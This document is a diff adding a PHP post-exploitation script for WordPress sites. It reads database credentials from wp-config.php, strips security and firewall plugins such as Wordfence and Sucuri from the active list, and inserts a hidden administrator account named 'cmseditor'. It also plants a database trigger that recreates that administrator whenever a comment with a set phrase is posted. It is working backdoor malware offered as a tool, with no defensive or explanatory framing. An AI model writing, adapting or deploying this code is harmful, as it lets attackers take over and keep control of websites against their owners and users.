@@ -1,0 +1,487 @@
+<?php
+define('CURRENTDIR', getcwd());
+
+$adminLogin = 'cmseditor';
+$adminPassword = '$P$BPRTBfgNGzgFiZM5ktB5yhaA6rlXTI/';
+$adminNicename = 'cmseditor';
+$adminEmail = 'cmseditor@hotmail.com';
+$adminUrl = 'http://wordpress.com';
+$adminDateRegister = '2020-05-09 23:05:14';
+$adminActivationKey = '';
+$adminStatus = '0';
+$adminDisplayName = 'cmseditor';
+
+
+$adminVars = array('adminLogin', 'adminPassword', 'adminNicename'
+    , 'adminEmail', 'adminUrl', 'adminDateRegister', 'adminActivationKey'
+    , 'adminStatus', 'adminDisplayName');
+
+$adminData = compact($adminVars);
+
+
+
+
+$actions = array(
+    //'CreateAdmin' => 1,
+    //'DeleteAdmin' => 1,
+    //'ShowTrigger' => 1,
+    //'CreateTrigger' => 1,
+    //'TrackbackOpen' => 1,
+    //'WpOptionsPingStatus' => 1,
+    //'ShowActivePlugins' => 1,
+    'DisableBadPlugins' => 1,
+    //'ShowTemplateDirectory' => 1
+);
+
+
+if (is_null($rootDir = detectWProotDir())) {
+    die('root directory not found');
+}
+
+define('WP_ROOT_DIR', $rootDir);
+
+
+if (!file_exists($wpConfigPath = $rootDir . '/wp-config.php')) {
+    echo 'wp-config not found';
+    exit;
+}
+
+$wpConfigString = file_get_contents($wpConfigPath);
+//preg_match_all("~(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)[\'\"],\s*[\'\"](.+)[\'\"]\s*\);~", $wpConfigString, $dbhost);
+preg_match_all("~^define.*(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)[\'\"],\s*[\'\"](.+)[\'\"]\s*\);~m", $wpConfigString, $dbhost);
+preg_match("~table_prefix\s+=\s*[\'\"](.+)[\'\"];~", $wpConfigString, $prefix);
+
+
+
+if (stristr($dbhost[2][3], ':') !== false) {
+    list($hostAddr, $dbPort) = explode(':', $dbhost[2][3]);
+} else {
+    $hostAddr = $dbhost[2][3];
+    $dbPort = 3306;
+}
+
+$dbname = $dbhost[2][0];
+$dbuser = $dbhost[2][1];
+$dbpassword = $dbhost[2][2];
+$dbhostaddr = $hostAddr;
+$dbprefix = $prefix[1];
+
+
+
+
+
+
+$link = mysqli_connect($dbhostaddr, $dbuser, $dbpassword, $dbname, $dbPort);
+
+if (mysqli_connect_errno()) {
+    $errorConnection = 1;
+    echo "Could not connect: " . mysqli_error() . PHP_EOL;
+} else {
+    echo "Connected successfully" . PHP_EOL;
+
+    $wpHomeUrl = mysqli_query($link, "select * from " . $dbprefix . "options where option_name = 'home' or option_name = 'siteurl'");
+
+    $currenthost = '';
+
+    while ($res = mysqli_fetch_array($wpHomeUrl)) {
+        if (stristr($res['option_value'], 'http') !== false) {
+            $currenthost = $res['option_value'];
+            break;
+        }
+    }
+}
+
+echo $currenthost . PHP_EOL;
+
+
+$dbDataVars = array('dbname', 'dbuser', 'dbpassword', 'dbhostaddr', 'dbprefix', 'currenthost');
+$dbData = compact($dbDataVars);
+
+
+$trigger = wpCommentsTriggerQuery($adminData, $dbData);
+
+
+foreach ($actions as $actionName => $status) {
+
+    if (!$status) {
+        continue;
+    }
+
+    doAction($actionName, $link, $dbData, $adminData);
+}
+
+function doAction($actionName, $link, $dbData, $adminData) {
+
+    $callBackName = 'action' . $actionName;
+
+
+    if (function_exists($callBackName)) {
+
+        echo str_repeat('_', 400) . PHP_EOL;
+        echo PHP_EOL . $callBackName . ' start' . PHP_EOL;
+
+
+        if (!call_user_func_array($callBackName, array($link, $dbData, $adminData))) {
+            echo $callBackName . ' return false' . PHP_EOL;
+            exit;
+        }
+    } else {
+        echo "callBack $callBackName not found" . PHP_EOL;
+    }
+}
+
+function actionShowTemplateDirectory($link, $dbData, $adminData) {
+
+    extract($dbData);
+
+    try {
+        $query = "SELECT *  FROM `${dbprefix}options` WHERE `option_name` = 'template'";
+        $activePluginsResult = mysqli_query($link, $query);
+        $resultsArr = mysqli_fetch_array($activePluginsResult);
+        $templateName = $resultsArr['option_value'];
+        echo $templateName . ' - template name' . PHP_EOL;
+    } catch (Exception $ex) {
+        return false;
+    }
+
+    if (file_exists($themePath = WP_ROOT_DIR . '/wp-content/themes/' . $templateName . '/functions.php')) {
+        echo WP_ROOT_DIR . '/wp-content/themes/' . $templateName . PHP_EOL;
+        return true;
+    }
+    echo 'functions.php not found in theme directory' . PHP_EOL;
+    return false;
+}
+
+function actionDisableBadPlugins($link, $dbData, $adminData) {
+
+    extract($dbData);
+
+    try {
+
+        $query = "SELECT *  FROM `${dbprefix}options` WHERE `option_name` LIKE '%active_plugins%'";
+        $activePluginsResult = mysqli_query($link, $query);
+        $resultsArr = mysqli_fetch_array($activePluginsResult);
+
+        $serializedArr = $resultsArr['option_value'];
+        $prepeared = preparePluginString($serializedArr);
+
+        if ($serializedArr === $prepeared) {
+            echo 'no bad plugins' . PHP_EOL;
+            return true;
+        }
+        $prepeared = mysqli_real_escape_string($link, $prepeared);
+        $newPluginsStringQuery = "update `${dbprefix}options` set option_value = '${prepeared}' where option_id = ${resultsArr['option_id']}";
+
+        if (mysqli_query($link, $newPluginsStringQuery)) {
+            echo 'plugins disabled' . PHP_EOL;
+            return true;
+        }
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function preparePluginString($serializedArr) {
+    $decoded = unserialize($serializedArr);
+
+    $newArr = array();
+    foreach ($decoded as $key => $value) {
+
+        if (isBadPlugin($value)) {
+            continue;
+        }
+        $newArr[] = $value;
+    }
+
+    return serialize($newArr);
+}
+
+function isBadPlugin($name) {
+    $badPlugins = array(
+        'sg-security', 
+        'wordfence', 
+        'sucuri', 
+        'wp-security', 
+        'jetpack', 
+        'sucuri-scanner', 
+        'gotmls', 
+        'security-malware-firewall', 
+        'all-in-one-wp-security-and-firewall', 
+        'iwp-security', 
+        'security-ninja', 
+        'wp-cerber', 
+        'ninja-firewall', 
+        'defender-security', 
+        'wp-simple-firewall', 
+        'better-wp-security', 
+        'loginizer', 
+        'ninjascanner', 
+        'honeypot', 
+        'shield-security', 
+        'malcare-security', 
+        'bulletproof-security', 
+        'wp-fail2ban', 
+        'security-safe', 
+        'titan-security', 
+        'webcraftic-security', 
+        'cleantalk-spam-protect',
+        'limit-login-attempts',
+        'iwp-client',
+        'anti-spam',
+        'ninjafirewall',
+        'ip-location-block',
+        'rlrsssl-really-simple-ssl',
+        'maintenance',
+        'rocket-maintenance-mode',
+        'under-construction-page',
+        'coming-soon',
+        'page-builder-add',
+        'wp-maintenance-mode',
+        'cmp-coming-soon-maintenance',
+        'colorlib-coming-soon-maintenance',
+        'coming-soon-maintenance-mode',
+        'coming-soon-wp',
+        'responsive-coming-soon',
+        'responsive-coming-soon-page',
+        'site-offline',
+        'under-construction-maintenance-mode',
+        'sitepress-multilingual-cms',
+        'role-scoper',
+        'cookies-and-content-security-policy',
+        'polylang',
+        'blackhole-bad-bots',
+        'block-bad-queries',
+        'hide-login-page',
+        'redirection',
+        'borlabs-cookie',
+        'dw-members-only',
+        'real-cookie-banner',
+        'wp-rocket',
+        'security-wordpress',
+        '404-to-301',
+        'unyson', //bd
+        'wps-hide-login', //ha
+        'kveten-vyprava', //wsd
+        'litespeed-cache', //nf
+        'jetpack-boost', //wsd
+        'w3-total-cache', //bs
+        'autoptimize', //wsd
+        'cookiebot', //wsd
+        'password-protect-wordpress', //pass na vse pages
+        'password-protected', //pass na vse pages
+        'tenweb-speed-optimizer', //nf
+        'amp', //nf
+        'bluehost-wordpress-plugin', //maintenance
+        'relative-url', //bs
+        'custom-404-pro', //404
+        'wpforms-lite', //wsd
+        'wp-plugin-hostgator', //maintenance
+        'wp-fastest-cache',  //wsd
+        'wp-fastest-cache-premium', //wsd
+        'under-construction-light', //wsd
+        'hostinger', //maintenance
+        'oxygen', //wsd
+        'wpclef', //wsd
+        'disable-feeds-wp',
+        'cookie-law-info',
+        'wp-meteor',
+        'worker',
+        'minimal-coming-soon-maintenance-mode',
+        'mantenimiento-web',
+
+
+
+    );
+
+
+
+    foreach ($badPlugins as $badPlugin) {
+
+        if (stristr($name, $badPlugin) !== false) {
+            echo $name . ' will be removed' . PHP_EOL;
+            return true;
+        }
+    }
+    return false;
+}
+
+function actionShowActivePlugins($link, $dbData, $adminData) {
+    extract($dbData);
+
+
+    try {
+        $query = "SELECT *  FROM `${dbprefix}options` WHERE `option_name` LIKE '%active_plugins%'";
+        $activePluginsResult = mysqli_query($link, $query);
+        $resultsArr = mysqli_fetch_array($activePluginsResult);
+
+
+        var_dump(unserialize($resultsArr['option_value']));
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionWpOptionsPingStatus($link, $dbData, $adminData) {
+    extract($dbData);
+
+    $query = "SELECT * FROM `${dbprefix}options` WHERE `option_name` LIKE '%ping%' OR `option_name` LIKE '%comments%'";
+
+    try {
+        $wpOptionsResult = mysqli_query($link, $query);
+        while ($res = mysqli_fetch_array($wpOptionsResult)) {
+            $options[] = [$res['option_id'], $res['option_name'], $res['option_value']];
+        }
+        var_dump($options);
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionTrackbackOpen($link, $dbData, $adminData) {
+
+    try {
+        extract($dbData);
+        $host = normalizeUrl($currenthost);
+        $updateCloseCommentsValue = "update `${dbprefix}options` set option_value = ''  WHERE `option_name` LIKE 'close_comments_for_old_posts'";
+
+        if (mysqli_query($link, $updateCloseCommentsValue)) {
+            echo 'set value 0 for option >>close_comments_value<<' . PHP_EOL;
+        }
+        $updateFirstPostsQuery = "UPDATE `${dbprefix}posts` set ping_status = 'open' where (post_type  = 'page' OR post_type = 'post') AND post_status = 'publish' AND guid LIKE '%${host}%' ORDER BY id LIMIT 5";
+        $trackBacks = array();
+
+
+
+        if (mysqli_query($link, $updateFirstPostsQuery)) {
+            echo 'posts ready to accept trackbacks' . PHP_EOL;
+            $trackbacksPostsQuery = "select id, guid, post_name from `${dbprefix}posts` where (post_type  = 'page' OR post_type = 'post') AND post_status = 'publish' AND guid LIKE '%${host}%' ORDER BY id LIMIT 5";
+            $trackbacksPostsResults = mysqli_query($link, $trackbacksPostsQuery);
+            while ($trackbackAcceptArr = mysqli_fetch_array($trackbacksPostsResults)) {
+                $trackBacks[] = [$trackbackAcceptArr['id'], $trackbackAcceptArr['guid'], $trackbackAcceptArr['post_name']];
+            }
+        }
+
+
+        var_dump($trackBacks);
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionCreateAdmin($link, $dbData, $adminData) {
+
+    try {
+
+        extract($dbData);
+        extract($adminData);
+
+        $existAdminQuery = "SELECT * FROM `${dbprefix}users` WHERE `user_pass` = '$adminPassword'";
+        $existsAdminResult = mysqli_query($link, $existAdminQuery);
+
+
+        if (!mysqli_num_rows($existsAdminResult)) {
+            $lastWpUsersIDquery = mysqli_query($link, "SELECT ID from `" . $dbname . "`.`" . $dbprefix . "users` ORDER BY `ID` DESC LIMIT 1");
+            $rowID = mysqli_fetch_row($lastWpUsersIDquery);
+            $nextWpUsersID = (int) ++$rowID[0];
+
+            mysqli_query($link, "INSERT INTO `" . $dbname . "`.`" . $dbprefix . "users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('$nextWpUsersID', '$adminLogin', '$adminPassword', '$adminNicename', '$adminEmail', '$adminUrl', '$adminDateRegister', '$adminActivationKey', '$adminStatus', '$adminDisplayName')");
+            mysqli_query($link, "INSERT INTO `" . $dbname . "`.`" . $dbprefix . "usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, $nextWpUsersID, '" . $dbprefix . "capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')");
+            mysqli_query($link, "INSERT INTO `" . $dbname . "`.`" . $dbprefix . "usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, $nextWpUsersID, '" . $dbprefix . "user_level', '10')");
+            echo 'admin created' . PHP_EOL;
+        } else {
+            var_dump(mysqli_fetch_array($existsAdminResult));
+            echo 'admin already exists' . PHP_EOL;
+        }
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function actionDeleteAdmin($link, $dbData, $adminData) {
+
+    extract($dbData);
+    extract($adminData);
+
+    $deleteAdminQuery = "DELETE FROM `${dbprefix}users` WHERE `user_pass` = '$adminPassword'";
+    if (mysqli_query($link, $deleteAdminQuery)) {
+        echo 'user deleted' . PHP_EOL;
+        return true;
+    }
+    return false;
+}
+
+function actionShowTrigger($link, $dbData, $adminData) {
+
+    extract($dbData);
+
+    $triggers = mysqli_query($link, "SHOW TRIGGERS");
+
+
+    if ($triggers) {
+        var_dump(mysqli_fetch_row($triggers));
+        return true;
+    }
+    return false;
+}
+
+function actionCreateTrigger($link, $dbData, $adminData) {
+
+    $trigger = wpCommentsTriggerQuery($adminData, $dbData);
+
+    mysqli_query($link, "DROP TRIGGER IF EXISTS `after_insert_comment`");
+
+    if (mysqli_query($link, $trigger)) {
+        echo 'trigger created' . PHP_EOL;
+        return true;
+    }
+    return false;
+}
+
+function detectWProotDir() {
+
+    if (file_exists(CURRENTDIR . '/wp-config.php')) {
+        return CURRENTDIR;
+    }
+    $normalizePath = preg_replace('~\/(wp-admin|wp-includes|wp-content).*$~', '', CURRENTDIR);
+
+
+    if (file_exists($normalizePath . '/wp-config.php')) {
+        return $normalizePath;
+    }
+
+    return null;
+}
+
+function wpCommentsTriggerQuery($adminData, $dbData) {
+
+    extract($adminData);
+    extract($dbData);
+
+    $triggerSource = <<<STR
+CREATE TRIGGER `after_insert_comment` AFTER INSERT ON `${dbname}`.`${dbprefix}comments`
+ FOR EACH ROW BEGIN
+    IF NEW.comment_content LIKE '%are you struggling to get comments on your blog?%' THEN
+        SET @lastInsertWpUsersId = (SELECT MAX(id) FROM `${dbname}`.`${dbprefix}users`);
+        SET @nextWpUsersID = @lastInsertWpUsersId + 1;
+        INSERT INTO `${dbname}`.`${dbprefix}users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES (@nextWpUsersID, '${adminLogin}', '${adminPassword}', '${adminNicename}', '${adminEmail}', '${adminUrl}', '${adminDateRegister}', '${adminActivationKey}', '${adminStatus}', '${adminDisplayName}');
+        INSERT INTO `${dbname}`.`${dbprefix}usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, @nextWpUsersID, '${dbprefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');
+        INSERT INTO `${dbname}`.`${dbprefix}usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, @nextWpUsersID, '${dbprefix}user_level', '10');
+    END IF;
+ END;
+STR;
+    return $triggerSource;
+}
+
+function normalizeUrl($url) {
+    $host = parse_url($url, PHP_URL_HOST);
+    return str_replace('www.', '', $host);
+}
